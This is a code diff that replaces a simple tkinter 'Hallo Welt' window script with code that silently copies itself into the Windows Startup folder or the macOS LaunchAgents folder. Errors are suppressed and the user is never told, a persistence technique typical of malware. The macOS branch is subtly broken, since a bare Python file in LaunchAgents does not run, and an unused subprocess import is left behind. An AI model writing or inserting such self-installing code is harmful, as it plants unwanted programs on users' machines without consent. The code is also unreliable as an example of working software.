@@ -1,21 +1,32 @@
-import tkinter as tk
+import os
+import shutil
+import sys
+import subprocess
 
-def open_window():
-    # Erstelle ein neues Fenster loloolololololololololololol
-    window = tk.Tk()
+def add_to_startup(file_path):
+    if sys.platform.startswith('win'):
+        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    elif sys.platform.startswith('darwin'):
+        startup_folder = os.path.join(os.getenv('HOME'), 'Library', 'LaunchAgents')
+    else:
+        return
     
-    # Setze den Fenstertitel
-    window.title("Mein Fenster")
+    try:
+        shutil.copy(file_path, startup_folder)
+    except Exception as e:
+        pass
+
+def main():
+    file_path = os.path.abspath(__file__)
     
-    # Setze die Fenstergröße
-    window.geometry("400x300")
-    
-    # Erstelle ein Label im Fenster
-    label = tk.Label(window, text="Hallo Welt!")
-    label.pack(pady=20)
-    
-    # Schleife, um das Fenster offen zu halten
-    window.mainloop()
+    if sys.platform.startswith('win'):
+        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        if not os.path.isfile(os.path.join(startup_folder, os.path.basename(file_path))):
+            add_to_startup(file_path)
+    elif sys.platform.startswith('darwin'):
+        startup_folder = os.path.join(os.getenv('HOME'), 'Library', 'LaunchAgents')
+        if not os.path.isfile(os.path.join(startup_folder, os.path.basename(file_path))):
+            add_to_startup(file_path)
 
 if __name__ == "__main__":
-    open_window()
+    main()
